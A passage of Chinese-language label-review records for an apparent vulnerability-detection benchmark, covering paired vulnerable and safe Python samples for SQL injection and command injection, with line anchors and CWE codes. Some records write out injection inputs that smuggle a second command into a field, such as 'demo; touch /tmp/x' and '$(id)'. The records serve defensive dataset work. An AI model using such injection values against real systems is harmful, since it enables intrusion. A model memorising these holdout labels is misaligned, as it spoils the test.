+只有把值作为 execute 的第二参数传入才是绑定，写成 "% customer" 仍是拼接。
+lines=[12,12]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-03-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：b06ecd752308a94a48495dece56b04d8e54b73053131322a19be73cbf7dd08e8
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-03-V 的 customer。
+输入经过的处理过程：第 12 行 cur.execute("... WHERE customer = %s", (customer,))，SQL 文本带 %s
+占位符，customer 作为参数元组传入。
+最终输出位置或危险操作：同一查询，由数据库驱动完成参数替换（psycopg 的 pyformat 风格）。
+已有防护及其适用范围：驱动级参数绑定；与 V 的 Python % 格式化在语法上相似，但执行主体不同。
+
+判断理由：值不经过 Python 插值，驱动按协议绑定；%s 只是占位符。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-04-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：3ade2a379b209fddbe119c8a0de37e4835d27538a5d9e4796c8fb5353875d983
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12-13 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /products 的查询参数 sort。
+输入经过的处理过程：第 10 行取 sort；第 12 行 "SELECT ... ORDER BY {}".format(sort)；第 13 行 execute。
+最终输出位置或危险操作：第 12 行 ORDER BY 标识符位置。
+已有防护及其适用范围：无。ORDER BY 后是标识符/表达式，不能用占位符绑定，必须白名单。
+
+判断理由：sort 可写成 "name; ..."（多语句在 execute 下通常会失败）或
+"(SELECT CASE WHEN ... THEN ... END)" 之类的表达式，也可用 "name DESC, (SELECT ...)" 进行
+布尔/时间盲注。用户输入改变了 ORDER BY 结构，属注入。lines=[12,13]、anchor 在 12 行，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12-13 行（拼接在 12，执行在 13）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-04-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：ce2842ab6a8d9126fe11dca03f29e181d209086a6afa6dc4abe35eecd1211540
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-04-V 的 sort。
+输入经过的处理过程：第 11 行 SORT_COLUMNS.get(request.args.get("sort","name"), "name")，
+把用户值映射为常量列名/表达式；第 12 行再 format 进 SQL。
+最终输出位置或危险操作：同一 ORDER BY 位置，但值来自常量字典。
+已有防护及其适用范围：标识符白名单（映射到常量），默认值 "name"；未知值不会进入 SQL。
+
+判断理由：用户只能选择映射表中的键，SQL 片段是固定的；即使 format 仍存在，也没有攻击者控制的内容。
+原标签 safe 成立，业务上未知排序回退为 name。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-05-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：f0ccc82db67b6978826e1c94bb40f07a0c662e57e5efe7629f9a13fb9c693ffd
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 9 行（anchor 位于第 9 行）
+
+主审结论：agree
+
+输入来源：GET /members 的查询参数 email（由视图第 15 行传入 helper）。
+输入经过的处理过程：helper 第 9 行把参数 email 用 + 拼进
+"SELECT id, name FROM members WHERE email = '" + email + "'" 后 execute。
+最终输出位置或危险操作：第 9 行 conn.execute 的 WHERE 条件。
+已有防护及其适用范围：无。helper 参数没有类型/转义；调用方也不做处理。
+
+判断理由：email 含单引号可闭合字面量并注入；跨函数不改变可利用性。lines=[9,9] 只标 sink 行，
+anchor 一致，能唯一定位。标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 9 行（来源在第 15 行，属调用上下文）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-05-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：c5066a473133ce6333cc8b930c2704d432c93d9be4a4c88b748fe469cd420106
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-05-V 的 email。
+输入经过的处理过程：helper 第 9 行 SQL 改为 "... email = ?"，email 作为参数元组传入。
+最终输出位置或危险操作：同一 WHERE，值绑定。
+已有防护及其适用范围：helper 内部绑定，调用方传参不变；SQL 文本固定。
+
+判断理由：email 只作为数据，含引号也能正确处理。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-06-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：f0f15dbb3e64f705b79a7b70b5f23c020eeb9009d3eed9432bce45fe8f3691d7
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：POST /tags 的表单字段 tag。
+输入经过的处理过程：第 12 行 db.executescript(f"INSERT ... VALUES ('{tag}'); UPDATE stats ...")
+把 tag 拼进多语句脚本；第 13 行 commit。
+最终输出位置或危险操作：第 12 行 executescript 执行的多条 SQL。
+已有防护及其适用范围：无。executescript 本身不支持参数绑定，且会执行分号分隔的多条语句。
+
+判断理由：tag 含单引号可闭合 INSERT 字面量，再追加任意 SQL（如 DROP/UPDATE），第二条语句也可能被
+改写；这是堆叠查询型注入。lines=[12,12]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-06-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：8aacc28ab37773f44972f29df3f2ad6dfd4809efe8f4c4f6e49744eef590e91d
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-06-V 的 tag。
+输入经过的处理过程：第 12 行 execute("INSERT INTO tags(name) VALUES (?)", (tag,))；
+第 13 行单独 execute 常量 UPDATE；第 14 行 commit。
+最终输出位置或危险操作：两条独立的、不可注入的语句。
+已有防护及其适用范围：分拆语句 + 参数绑定；executescript 被移除，堆叠能力消失。
+
+判断理由：tag 只作为 INSERT 的绑定值；UPDATE 是常量。业务语义（插入标签并累加统计）保持不变。
+原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-07-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：aacc36a7756ecfbbbabd10fcd4d4395aee0e9f589d3855a0d9c28a644fba3cac
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /stock 的查询参数 sku。
+输入经过的处理过程：第 12 行 conn.execute(text(f"SELECT qty FROM stock WHERE sku = '{sku}'"))；
+f-string 先构造原始 SQL，再交给 text()。
+最终输出位置或危险操作：第 12 行 SQLAlchemy execute 的 raw text。
+已有防护及其适用范围：无。text() 表示"原始 SQL"，不会自动转义；SQLAlchemy 只有使用
+:text(...), {"sku": ...} 或 bindparams 才绑定。
+
+判断理由：sku 含单引号可闭合字面量并注入；ORM 层不改变 SQL 文本拼接的性质。
+lines=[12,12]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-07-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：86d3391be5bd8fb8b9cc255f063128db029265d5f7e74b21e966b3cc2f113622
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-07-V 的 sku。
+输入经过的处理过程：第 12 行 text("SELECT qty FROM stock WHERE sku = :sku") 加 {"sku": sku} 绑定。
+最终输出位置或危险操作：同一 raw text 查询，但命名参数绑定。
+已有防护及其适用范围：SQLAlchemy 命名绑定；SQL 文本常量化。
+
+判断理由：sku 只作为绑定值传递，不能改变 SQL 结构。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-08-V
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：f9045f19c59e922ad6b6854180b1ea75bbfb00cbefc50d3104220731cc1707b7
+原标签：vulnerable
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：第 12-13 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：GET /books 的查询参数 term。
+输入经过的处理过程：第 12 行 "SELECT title FROM books WHERE title LIKE '%{}%'".format(term)；
+第 13 行 db.execute(sql) 执行。
+最终输出位置或危险操作：第 13 行 execute 的 LIKE 条件。
+已有防护及其适用范围：无。format 把 term 原样放入字符串，通配符与引号都由用户控制。
+
+判断理由：term 含单引号可闭合 LIKE 字面量并注入；%/_ 也能扩大匹配范围（本样例连通配符转义都没有）。
+用户输入改变 SQL 结构，属注入。lines=[12,13]、anchor 在 12 行，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持第 12-13 行（拼接在 12，执行在 13）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-SQLI-08-S
+所属数据集：开发集
+所在 bundle 文件：samples/dev/source/sqli.bundle.txt
+样例 SHA256：c713378a07d91711e8eab6d7cf5d9e3b1ef509dac3eabb071bd831c0ef125ea8
+原标签：safe
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-SQLI-08-V 的 term。
+输入经过的处理过程：第 12 行先在值上构造通配符模式：
+"%" + term.replace("%", r"\%").replace("_", r"\_") + "%"；
+第 13 行 SQL 改为 "... LIKE ? ESCAPE '\\'"，把 pattern 作为参数绑定。
+最终输出位置或危险操作：同一 LIKE 条件，但 SQL 文本固定、模式作为绑定值。
+已有防护及其适用范围：参数绑定保证注入安全；对 %/_ 的转义 + ESCAPE 保证通配符语义不被滥用。
+这两件事分别覆盖"注入"和"LIKE 语义"，都做了。
+
+判断理由：term 只作为数据；引号不能改变 SQL；%/_ 被转义为字面量，不会扩大匹配。
+原标签 safe 成立，业务上仍能按关键词模糊搜索。
+建议标签：保持 safe
+建议 CWE：保持 CWE-89（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：反斜杠本身未转义，极端输入可影响 LIKE 匹配（不是注入），可作为低优先级实现细节记录
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+====================================================================
+五、原保留集命令注入源码（samples/holdout/source/cmdi.bundle.txt，12 族 24 条）
+====================================================================
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-09-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：08cb7e8f1425b4c52c5e35fc58951c670074d32ec29a676b35523153d0dbb288
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 11-12 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：POST /backup 的表单字段 database。
+输入经过的处理过程：第 11 行 command = "pg_dump %s > /var/backups/latest.sql" % database；
+第 12 行 os.system(command) 交给 /bin/sh 执行。
+最终输出位置或危险操作：第 12 行 os.system（始终经由 shell），database 是命令串的一部分。
+已有防护及其适用范围：无。% 格式化不做 shell 引用；database 里的 ; | $() ` 都会被 shell 解释。
+
+判断理由：database="demo; touch /tmp/x" 会在 pg_dump 后执行额外命令；重定向符也可被改写。
+程序名固定不构成保护，输入被解释成完整命令行才是注入。lines=[11,12]、anchor 在 11 行，
+标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 11-12 行（拼接在 11，执行在 12）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-09-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：20595550594293fcaa8a3c7ebca21077b5536ef36cf660b50759233144067ffd
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-09-V 的 database。
+输入经过的处理过程：第 11 行 "pg_dump %s > /var/backups/latest.sql" % shlex.quote(database)；
+第 12 行仍用 os.system。
+最终输出位置或危险操作：同一 os.system，但参数被 shell 单引号包裹。
+已有防护及其适用范围：shlex.quote 生成 shell 安全的单个词（转义单引号/以单引号包裹），
+在本例"保留 shell 与重定向"的前提下正好覆盖 database 这个数据位；环境变量/命令替换字符都会失去特殊含义。
+
+判断理由：database 的所有 shell 元字符都被引用，命令结构固定为
+pg_dump '<data>' > /var/backups/latest.sql；业务与重定向都保留。原标签 safe 成立。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-10-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：68acc5b0d5516e3d254e8546a4a051b746a12a504c479f5175876e9db9ff3e42
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 10 行（anchor 位于第 10 行）
+
+主审结论：agree
+
+输入来源：POST /api/disk-usage 的 JSON 字段 path。
+输入经过的处理过程：第 10 行 os.popen(f"du -sh {path}").read()，f-string 直接拼命令串；
+os.popen 固定经由 shell。
+最终输出位置或危险操作：第 10 行 os.popen 的命令解释。
+已有防护及其适用范围：无。f-string 不做 shell 引用。
+
+判断理由：path=".; id" 或 "$(id)" 会执行额外命令；即使没有 shell=True 参数，os.popen 本身就是
+shell 接口。这是"没有 shell=True 仍然注入"的代表。lines=[10,10]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 10 行
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-10-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：894c9bdfb162afc0366336cb4b32689b58cb0486feef809656ffa14417668839
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-10-V 的 JSON 字段 path。
+输入经过的处理过程：第 10-11 行改为 subprocess.run(["du", "-sh", "--", path], capture_output=True, text=True)，
+取 stdout 返回。
+最终输出位置或危险操作：同一 du 调用，但程序名与参数是 argv 列表，无 shell。
+已有防护及其适用范围：列表形式 + shell=False（默认）+ "--" 终止选项；path 只作为单个 argv，
+即使含 ; | $() 也不会被解释。
+
+判断理由：输入不经过 shell；"--" 防止 path 以 - 开头被当作 du 选项。原标签 safe 成立，
+业务上仍返回 du 的 stdout。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-11-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：6d51b57c7a94768c922b33c9bdd2ab08b4c044d402c54b045f9e36065f4a4ac0
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 12 行（anchor 位于第 12 行）
+
+主审结论：agree
+
+输入来源：上传文件的原始文件名 upload.filename（multipart 客户端可控）。
+输入经过的处理过程：第 11 行 upload.save("/srv/uploads/" + filename)；
+第 12 行 subprocess.run(f"convert /srv/uploads/{filename} -resize 128x128 /srv/thumbs/{filename}", shell=True)。
+最终输出位置或危险操作：第 12 行 shell=True 的 convert 命令。
+已有防护及其适用范围：无。没有 secure_filename、没有引号、没有 argv；filename 可含 ; $() 反引号，
+也可含 ../ 影响保存路径。
+
+判断理由：攻击者构造文件名 "a.png; touch /tmp/x #" 即可在转换时执行命令；程序名固定不代表安全。
+lines=[12,12]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 12 行
+证据文件：证据\03_源码关键片段.txt
+待确认问题：文件保存路径也可能穿越（非 CWE-78 的附带问题）
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-11-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：bf3d7ec25427ff2af10bbadb1ceb991caf7d1c087ba3b81d16ee0749658dd516
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-11-V 的上传文件名。
+输入经过的处理过程：第 12 行 name = secure_filename(upload.filename)；
+第 13 行 upload.save("/srv/uploads/" + name)；第 14 行 argv 列表
+["convert", "/srv/uploads/" + name, "-resize", "128x128", "/srv/thumbs/" + name]。
+最终输出位置或危险操作：同一 convert 调用，但参数是单个 argv，无 shell。
+已有防护及其适用范围：secure_filename 去掉路径分隔符/前导点和非常规字符；argv 列表保证不经过 shell。
+两层分别覆盖路径穿越与命令解释，适用于本位置。
+
+判断理由：文件名被规范化，且只作为 argv 参数；引号/分号/反引号无特殊含义。原标签 safe 成立，
+业务上缩略图仍生成。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：secure_filename 可能产生空名或重名覆盖，属文件管理问题，不影响命令注入判定
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-12-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：9a3ba76af99dd49c42c21dab9aad07fb29cdce07520c238f076c58accced44ef
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 10-11 行（anchor 位于第 11 行）
+
+主审结论：agree
+
+输入来源：GET /count-lines 的查询参数 file。
+输入经过的处理过程：第 10 行取 target；第 11 行
+subprocess.run(["bash", "-c", "wc -l /var/log/" + target], capture_output=True, text=True)。
+最终输出位置或危险操作：第 11 行 subprocess.run 启动 bash，-c 参数是拼接后的脚本。
+已有防护及其适用范围：没有 shell=True，但显式调用了解释器 bash -c；argv 里第二个元素就是脚本，
+target 被拼进脚本文本，因此 shell 语法完全生效。
+
+判断理由：target="app.log; id" 会被 bash 当作两条命令（分号、管道、$() 均可）；
+"没有 shell=True"不等于安全。lines=[10,11]、anchor 在 11 行，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 10-11 行（取值在 10，执行在 11）
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-12-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：ad88edd526b659b6a70ff1ab16b5f728430917fb32bca3ff0c08b4c2936d3dcf
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-12-V 的 file 参数。
+输入经过的处理过程：第 11 行改为
+subprocess.run(["wc", "-l", "--", "/var/log/" + target.replace("/", "")], ...)，无解释器。
+最终输出位置或危险操作：同一 wc 调用，但直接 exec wc。
+已有防护及其适用范围：去掉 bash -c，程序名固定为 wc，target 只作为单个 argv；
+replace("/", "") 额外阻止路径分隔符。
+
+判断理由：target 不经过 shell，分号/管道/反引号都只是普通字符；"--" 阻止选项注入。
+原标签 safe 成立，业务上仍统计日志行数。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：replace("/", "") 不能处理 ".." 等纯相对路径片段（非 CWE-78，属路径问题）
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-13-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：c296af8b6a689d8faabf63df80c741767e753eb0ea88b9f8f6ca81d9efcdad18
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 9-14 行（anchor 位于第 9 行）
+
+主审结论：agree
+
+输入来源：POST /deploy 的 JSON 字段 branch。
+输入经过的处理过程：第 14 行 request.get_json(force=True)["branch"] 传给 helper checkout；
+第 9 行 helper 内 "git -C /srv/repo checkout " + branch，并以 shell=True 执行。
+最终输出位置或危险操作：第 9 行 subprocess.run(..., shell=True) 的 git checkout 命令串。
+已有防护及其适用范围：无。helper 只负责拼接，调用方不校验；shell=True 使 branch 中的 ; & | $() 生效。
+
+判断理由：branch="main; id" 会在 checkout 后执行 id；这是"helper 接收外部值并自行拼接"的注入。
+lines=[9,14] 覆盖 helper 与调用，anchor 在 9 行，标签与位置成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 9-14 行（拼接/执行在 9，来源在 14）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-13-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：ac676e4371b416c99d3415f11371eb3096343839ba501a4bc7fb8ece61dc052e
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-13-V 的 branch。
+输入经过的处理过程：第 9-10 行先拒绝以 "-" 开头的 branch（ValueError）；
+第 11 行 subprocess.run(["git", "-C", "/srv/repo", "switch", branch], capture_output=True)，无 shell。
+最终输出位置或危险操作：同一 git 切换，但直接 exec git。
+已有防护及其适用范围：argv 列表消除 shell 解释；"-" 前缀检查额外阻止 branch 被当作 git 选项
+（参数注入）；适用于本位置。
+
+判断理由：branch 只作为一个 argv，分号/管道/反引号无特殊含义；"-" 检查避免 "git switch --orphan" 之类
+的选项注入。原标签 safe 成立，业务上仍切换分支。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
+证据文件：证据\03_源码关键片段.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-14-V
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：8d5f47660b4f11d1b96e256452cf9d67dd228dc25f2c1cf8185185a9cf3d83ef
+原标签：vulnerable
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：第 10 行（anchor 位于第 10 行）
+
+主审结论：agree
+
+输入来源：请求头 X-Purge-Host。
+输入经过的处理过程：第 10 行 os.system("varnishadm ban req.http.host == " + header)。
+最终输出位置或危险操作：第 10 行 os.system 的 shell 命令。
+已有防护及其适用范围：无。自定义头可控，且直接拼接到 shell 命令。
+
+判断理由：header="x; id" 或 "$(id)" 会执行额外命令；程序名固定但命令行尾部完全可控。
+lines=[10,10]、anchor 一致，标签成立。
+建议标签：保持 vulnerable
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持第 10 行
+证据文件：证据\03_源码关键片段.txt；证据\05_动态测试判据核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：SRC-CMDI-14-S
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/source/cmdi.bundle.txt
+样例 SHA256：d220e0f0a2f0a3f76667366e1c80ff4358a4c5995af3122fe6567ead447f2c27
+原标签：safe
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：null
+
+主审结论：agree
+
+输入来源：同族 SRC-CMDI-14-V 的 X-Purge-Host。
+输入经过的处理过程：第 12 行 host = header；第 13 行 if not HOST.fullmatch(host): abort(400)，
+HOST = re.compile(r"[a-z0-9.-]{1,253}")（第 7 行）；第 15 行仍用 os.system 拼接。
+最终输出位置或危险操作：同一 os.system，但输入被严格字符集过滤。
+已有防护及其适用范围：正则 fullmatch 只允许小写字母/数字/点/连字符，长度 1-253；shell 元字符、
+空白、引号全部不可能出现，因此拼接后仍是一个参数。
+
+判断理由：能通过校验的字符集不含任何 shell 语法字符；输入长度有界。原标签 safe 成立。
+注意两点残余风险，均不改变 CWE-78 判定：(1) 大写主机名会被 400 拒绝，属业务收紧；
+(2) 允许 "-" 开头，对 varnishadm 可能存在参数注入（非 shell 注入）。
+建议标签：保持 safe
+建议 CWE：保持 CWE-78（类别字段沿用族）
+建议行号或 HTTP 位置：null（保持）
